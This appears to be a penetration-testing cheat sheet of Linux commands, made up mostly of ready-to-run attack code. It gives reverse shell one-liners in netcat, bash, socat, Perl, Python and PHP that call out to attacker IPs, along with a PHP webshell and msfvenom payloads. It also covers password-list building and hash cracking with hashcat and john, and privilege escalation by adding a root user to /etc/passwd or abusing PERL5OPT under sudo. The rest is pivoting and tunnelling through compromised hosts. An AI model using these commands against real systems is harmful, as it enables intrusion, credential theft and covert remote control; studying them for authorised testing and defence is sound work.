# Bash
* https://www.bashoneliners.com/
* https://wiki.bash-hackers.org/syntax/expansion/brace

# Create Password List
Create text file with keywords
```bash
January 
February
March
April
May
June
July
August
September
October
November
December
Autumn
Spring
Fall
Summer
Winter
Password
Forest
Secret
```
```bash
for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; echo ${i}2020; echo ${i}2019; done > tmp
mv tmp pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule -r /usr/share/hashcat/rules/toggles1.rule   > tmp
mv tmp pwlist.txt
```

# Custom wordlist generator
Fetch Keywords from a website
* [CeWL](https://digi.ninja/projects/cewl.php)
```
cewl www.domain.com -m 6 -w wordlist.txt
```
* [crunch](https://sourceforge.net/projects/crunch-wordlist/)

|Placeholder| 	Character Translation|
|----------|-------------------|
|@ |Lower case alpha characters|
|, |Upper case alpha characters|
|% |Numeric characters|
|^ |Special characters including space|
```
crunch 6 6 -t %%%%^^ > chars.txt
crunch 24 24 -t ThisIsTheUsersPassword%% -o crunched.txt 
```

# RDP Tool for Linux
* Remmina (apt install remmina)
* xfreerdp (installed by default on kali)
Proxychains example with xfreerdp
```
proxychains xfreerdp /d:domain /u:user /v:10.10.10.10 +clipboard
```

# Download Accelerator
```bash
axel -a -n 20 -o report.pdf https://dummy.org 
```

# Log commands into file
```
script cmd.log
exit
```

# Automated IP Lookup
```bash
~/mfu# curl -s https://api.greynoise.io/v3/community/8.8.8.8 | python3 -m json.tool
{
    "ip": "8.8.8.8",
    "noise": false,
    "riot": true,
    "classification": "benign",
    "name": "Google Public DNS",
    "link": "https://viz.greynoise.io/riot/8.8.8.8",
    "last_seen": "2021-03-30",
    "message": "Success"
}
```

# Generate Shellcode from file
```
xxd -p lib.so | tr -d '\n' > lib.hex
# add '0x' before shellcode
```

# unshadow passwd file
```
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

# Reverse Shells
Use rlwrap to use arrow keys within reverse shell
```
rlwrap nc -lvnp 3141
```

Upgrade Reverse Shell:

1. `` Ctrl+z`` to background session
2. `` stty raw -echo``
3. ``fg`` to foreground session again

## Netcat
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # in case wrong version of nc is installed
```

## Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Socat
```
# Listener
socat -d -d TCP4-LISTEN:443 STDOUT
# Send bash reverse shell
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
```

## Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
#!/usr/bin/perl -w
use Socket;
$i="10.10.14.41";
$p=4443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
```

## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### very simple PHP webshell
```
<?php system($_GET["cmd"]);?>
```

### Command Execution with ``proc_open``
```
<?php

$cwd='/tmp';
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("file", "/tmp/error-output.txt", "a") );
$process = proc_open("whoami", $descriptorspec, $pipes, $cwd);

echo stream_get_contents($pipes[1]);
fclose($pipes[1]);

?>

```

 
## Using msfvenom 
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
msfvenom -p windows/exec CMD="cmd.exe /c type flag.txt" -f python -b"x00\x0a\x0d\x25\x26\x2b\x3d"
```

## Encrypted Shell
Socat Bind Shell
```
# Create Cert and Key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# Create .pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# Setup Listener
sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
# OR Setup Listener with
sudo socat -d -d OPENSSL-LISTEN:443,cert=rev_shell.pem,verify=0,fork STDOUT
# Connect
socat - OPENSSL:10.10.10.10:443,verify=0
# OR Connect with
socat OPENSSL:192.168.119.223:443,verify=0 EXEC:'cmd.exe',pipes

```

# Privilege Escalation
Resources:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
* https://payatu.com/guide-linux-privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation

## Get Capabilities
```
/sbin/getcap -r / 2>/dev/null
```

## Unix Privesc Check
* [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

## LinEnum
Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 

## Setuid bits
* https://gtfobins.github.io/
``` 
# Find SUID files
find / -user root -perm -4000 2>/dev/null
# Set UID bit
chmod u+s /script
```
## Search for executed cronjobs
```
grep "CRON" /var/log/cron.log
```

## Add user in /etc/passwd (if writable)
```
openssl passwd evil
echo "root2:Ur0xZo454Kq1s:0:0:root:/root/:/bin/bash" >> /etc/passwd
su root2 # passwd:evil
```

## ENV Variables
See https://www.elttam.com/blog/env/

### Example with PERL ENV variables
Assume the user may run a bash script called ``sudo /opt/monitor.sh``
We can abuse the ENV variable "PERL5OPT":

```bash
sudo 'PERL5OPT=-Mbase;print(`id`)' /opt/monitor.sh
```

# Dump screenshot from X11 session
Prerequisite: .Xauthority file from session
1. define XAUTHORITY variable: ``export XAUTHORITY=/tmp/.Xauthority``
2. get display used (FROM column): ``w``
3. use xwd to dump screenshot: ``xwd -root -screen -silent -display :0 > /tmp/screen.xwd``
4. convert xwd to png: ``convert screen.xwd screen.png``


# Port Forwarding 
## Create SSH Key with forwarding permissions only
```
from="10.11.1.250",command="echo 'This account can only be used for port
forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa
<SSHKEY> www-data@ajla
```

## Local Port Forwarding
Port is opened locally 

[rinetd](https://boutell.com/rinetd/) :
```
sudo apt install rinetd
echo "0.0.0.0 80 10.10.10.10 80" >> /etc/rinetd.conf # forward incoming requests on port 80 to 10.10.10.10 port 80
sudo service rinetd restart
```

SSH:
```
sudo ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 127.0.0.1:1234:10.10.10.10:5678 user@10.10.10.10
# open 1234 locally and forward it to 11.11.11.11 on port 5678
```

## Remote Port Forwarding 
Port is opened on the remote side
```
ssh -N -R [bind_address:]port:host:hostport [username@address]
ssh -N -R 10.10.10.10:4444:127.0.0.1:5555 user@10.10.10.10
# open port 4444 on 10.10.10.10 and forward ot to 127.0.0.1 port 5555
```
# SSH Dynamic Port Forwarding
Use proxy to tunnel any incoming traffic on local port to any remote destination
```
sudo ssh -N -D [bind_address:]port [username@address]
sudo ssh -N -D 127.0.0.1:4444 user@10.10.10.10 # open port 4444 and forward to 10.10.10.10
```
Edit /etc/proxychains.conf 
```
echo "socks 4 127.0.0.1 4444" >> /etc/proxychains.conf
sudo proxychains nmap -sT -Pn 10.10.10.12 # scan 10.10.10.12 through 10.10.10.10
```

# HTTPTunneling Through Deep Packet Inspection
* [HTTPTunnel](http://http-tunnel.sourceforge.net/)

Assuming the following setup:

Attacker Machine (Kali): 10.10.10.10
Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
Windows Server: 192.168.1.100
Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
Objective: Get a RDP Session to the Windows Server

1. Setup local forward on compromised machine
```
ssh -L 0.0.0.0:8888:192.168.1.100:3389
```
2. Setup HTTPTunnel server on compromised machine (hts)
```
hts --foward-port localhost:8888 4444
```
3. Setup HTTPTunnel client on attacker machine
```
htc --forward-port 8080 10.10.10.10:4444
```
4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
